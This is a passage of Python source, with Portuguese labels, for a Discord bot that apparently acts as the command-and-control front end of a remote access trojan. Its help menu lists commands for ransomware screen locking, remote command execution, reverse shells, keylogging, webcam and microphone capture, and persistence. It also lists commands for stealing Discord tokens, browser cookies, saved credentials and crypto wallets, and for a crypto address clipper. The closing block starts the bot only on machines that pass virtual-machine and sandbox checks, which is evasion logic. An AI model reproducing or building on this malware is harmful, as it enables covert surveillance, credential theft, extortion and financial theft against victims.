        self.embeds = embeds
        self.current_page = 0

    @discord.ui.button(label="Anterior", style=discord.ButtonStyle.blurple, disabled=True)
    async def previous_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current_page -= 1
        if self.current_page == 0:
            button.disabled = True
        self.next_button.disabled = False
        await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)

    @discord.ui.button(label="Próximo", style=discord.ButtonStyle.blurple)
    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current_page += 1
        if self.current_page >= len(self.embeds):
            self.current_page = len(self.embeds) - 1
            button.disabled = True
        self.previous_button.disabled = False
        await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)


@bot.hybrid_command(name = "help", with_app_command = True, description = "Menu de ajuda")
@app_commands.guilds(GUILD)
async def help(ctx: commands.Context):
    fields = [
        ("/help", "Mostrar este menu de ajuda"),
        ("/prefixo", "Alterar o prefixo do bot"),
        ("/ranso", "Travar a tela do alvo com ransomware"),
        ("/unranso", "Reverter as alterações feitas pelo ransomware"),
        ("/interact <id>", "Interaja com um id específico"),
        ("/conexao", "Mostrar ID atual"),
        ("/terminar", "Terminar conexão com id"),
        ("/cmd <command>", "Executar comandos dentro do alvo"),
        ("/cd <path>", "Alterar diretório atual"),
        ("/process", "Obtenha uma lista de todos os processos em execução"),
        ("/upload <url>", "Carregar arquivo para a maquina alvo"),
        ("/screenshot", "Screenshot da tela da maquina alvo"),
        ("/persistencia", "Habilitar persistência"),
        ("/ls", "Obtenha uma lista de todoas as maquinas(IDS) ativos"),
        ("/download <path>", "Baixar arquivo do alvo"),
        ("/cmd-all <command>", "Execute um comando em todos os id"),
        ("/revshell <ip> <port>", "Obtenha um shell reverso na máquina alvo"),
        ("/diretorios", "Obtenha uma lista de todos os diretórios do alvo"),
        ("/recordmic <interval>", "Grave o microfone da máquina alvo"),
        ("/wallpaper <path/url>", "Alterar o papel de parede da máquina alvo"),
        ("/killproc <pid>", "Mate um processo na máquina alvo"),
        ("/keylog <mode> <interval>", "start/stop um keylogger na máquina de destino\n/`keylog start 60`"),
        ("/excluir", "Excluir o ID"),
        ("/clip <mode>", "on/off o monitoramento do clipboard\n/`clip on`"),
        ("/startfile <path>", "Inicie um arquivo no alvo\n/`startfile C:\\Windows\\System32\\calc.exe`"),
        ("/delfile <path>", "Deleta um arquivo no alvo\n/`delfile C:\\Windows\\System32\\calc.exe`"),
        ("/hidefile <path>", "Esconde um arquivo no alvo\n/`hidefile C:\\Windows\\System32\\calc.exe`"),
        ("/unhidefile <path>", "Desesconde um arquivo no alvo\n/`unhidefile C:\\Windows\\System32\\calc.exe`"),
        ("/isadmin", "Verifica se o bot está sendo executado como administrador"),
        ("/screenrec", "Gravar a tela da máquina de destino"),
        ("/epicgames", "Obtenha o games.ini da máquina de destino"),
        ("/telegram", "Obtenha o telegram da máquina de destino"),
        ("/discord", "Obtenha o token do Discord da máquina de destino"),
        ("/cookies", "Obtém os cookies dos navegadores da máquina de destino"),
        ("/historico", "Obtém o histórico dos navegadores da máquina de destino"),
        ("/hardware", "Lista o hardware da máquina de destino"),
        ("/localizar", "Obtenha a localização da máquina alvo"),
        ("/webcam", "Tire uma foto da webcam"),
        ("/wallets", "Obtenha o backup das wallets"),
        ("/creds", "Obter credenciais salvas dos navegadores da máquina de destino"),
        ("/cryptoclip", "clipper de adress de criptomoeda"),
        ("/stopcryptoclip", "Parar o clipper de adress de criptomoeda")
    ]

    embeds = []
    for i in range(0, len(fields), 25):
        my_embed = discord.Embed(title="Menu de Ajuda", color=0x00FF00)
        my_embed.set_footer(text=f"Página {i//25 + 1}/{len(fields)//25 + 1}")
        for name, value in fields[i:i+25]:
            my_embed.add_field(name=name, value=value, inline=False)
        embeds.append(my_embed)

    view = HelpMenu(embeds)
    await ctx.reply(embed=embeds[0], view=view)

if vmsai.test() == True and layn.isVM() == False:
    config = layn.createConfig()
    ID = layn.id()
    if config:
        MSG = f"NOVO ID ONLINE #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"ID ONLINE #{ID}"
        COLOR = 0x0000FF

    bot.run(BOT_TOKEN)
